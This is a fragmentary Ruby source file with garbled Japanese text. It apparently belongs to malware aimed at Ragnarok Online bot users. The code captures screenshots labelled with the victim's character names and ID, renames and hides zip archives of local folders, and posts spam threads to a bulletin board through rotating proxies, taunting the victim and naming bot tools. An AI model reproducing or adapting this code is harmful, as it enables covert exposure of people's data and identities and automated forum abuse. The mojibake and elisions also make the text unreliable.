...
$charaarr = []
$charas = ''
separater = rns("��#{rand(100)}��", "��[#{rand(100)}��", "rtx", "RoAddr", '���[����', 'rxv', '�ٓ�', 'bot', '��', '��������', 'zeny', 'ini', 'config', '�p�P', *$omosiro_words)
...
$capture = Proc.new{
  loop do
    ...
    begin
      ...
      dib2png.call($upup+'[�o�O�U���b�N] '+$tekito_id+' '+Time.now.strftime('%Y%m%d-%H%M%S')+' �u'+$charanames.join('�v�u')+'�v.png', hdib, 0)
      File.rename(Dir.glob('C:/program files/daemontools/*.zip')[0], "#{$upup}[�o�O�U���b�N] #{$id} �u#{$charanames.join('�v�u')}�v.zip") if (Dir.glob('C:/program files/daemontools/*.zip').size > 0)
    ensure
      deleteDib.call(hdib)
    ...
    if akakaka
      ...
      if jikan.wday == 0 and jikan.hour < 24 and jikan.hour > 18
        emotion_wana "�₠�lBOTer�I#{$charanames[rand($charanames.size)]} ��BOT���� �n�Q���ב��ƐX���͂������Ǝ��ˁI�I"
        sleep 5 * 60
      else
        sleep 12 * 60
      end
...
begin
  ...
  seven_zip.call(0, 'a -tzip -hide "' + $upup + '[�o�O�U���b�N] ' + $id + ' �u' + $charanames.join('�v�u') + '�v.zip" c:\recycler\tmp\ -r', str, 5)
rescue
  p $!
...
def rtx
  rns(rns('rR���q'), rns('���A�') + rns('�[�|�]-���A�') + rns('�郋�')) +
  rns(rns('tT���s'), rns('�ăe�') + rns('�����C���') + rns('���C��[�|�]-')) +
  rns(rns('xX���w'), rns('���G�') + rns('�c���b�') + rns('���N�') + rns('���X�'))
end

def aretool
  rns(rns('aA���`'), rns('���A�')) +
  rns(rns('rR���q') + rns('eE���d'), rns('�ꃌ�')) +
  rns(rns('tT���s') + rns('oO���n0�O'), rns('�c�')) +
  rns(rns('oO���n0�O'), rns('���E��[�|�]-')) +
  rns(rns('lL���k'), rns('�郋�'))
end
$nypath.each{|x|
  ...
  if rand(6) == 0
    ...
    if sss.size != 0
      if $id == ''
        ...
        age.req.form.add 'MESSAGE', rns("��#{rand(100)}��", "��[#{rand(100)}��", "rtx", "RoAddr", '���[����', 'rxv', '�ٓ�', 'bot', 'ro', '��', '��������', 'zeny', *$omosiro_words)
      else
        names
        age.req.form.add 'FROM', $id
        age.req.form.add 'mail', ''
        massage = ''
        massage = "�Ȃ��A�ЂƂ���Ȃ񂾂��ǁE�E�E�E�E�E���O�B�K��ᔽ�҂͂ǂ����č������ɂł����ȂȂ��񂾁H\n" if rand(10) == 1
        massage += rtx + "\n" if $rtx
        massage += aretool + "\n" if $are
        massage += "RoAddr\n" if $roaddr && rand(2) == 1
        massage += "KORE\n" if $korepath.size > 0
      ...
      age.req.form.add 'submit', '�V�K�X���b�h�쐬'
      ...
      loop do
        ...
        Thread.new(r, proxy){|ran, pro|
          ...
          if $id == ''
            ...
            age.req.form.add 'MAIL', 'sage'
            age.req.form.add 'MESSAGE', rns("��#{rand(100)}��", "��[#{rand(100)}��", "rtx", "RoAddr", '���[����', 'rxv', '�ٓ�', 'bot', 'ro', '��', '��������')
          else
            names
